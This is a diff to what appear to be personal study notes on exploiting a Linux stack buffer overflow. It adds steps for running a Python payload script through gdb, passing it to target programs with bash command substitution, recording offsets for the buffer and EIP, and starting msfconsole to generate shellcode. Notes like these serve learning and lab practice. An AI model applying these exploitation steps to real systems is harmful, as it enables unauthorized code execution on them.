@@ -1014,6 +1014,8 @@ this throw 200 characters at it
    this will produce the minimum offset need to buffer overflow
    
 3. Validate the offset + craft exploit
+	####linux_buffer.py
+	
 	nano linux_buffer.py
 	
 	#!/usr/bin/python
@@ -1030,6 +1032,26 @@ this throw 200 characters at it
 	
 	print(buffer + eip + nop)
 	
+	gdb func
+	run <<< $(python linux_buffer.py)
+	
+	BASH COMMAND SUBSTITUTION
+	$( )
+	
+	Programs and Inputs
+	ProgramA.exe
+	Prompted:
+	
+	ProgramA.exe <<< $(python linux_buffer.py)
+	
+	ProgramB.exe $arg
+	ProgramB.exe $(python linux_buffer.py)
+	
+	the buffer is 62
+	the eip is 4
+	
+4. generate shellcode
+	msfconsole (update if you have to)
 
 
 
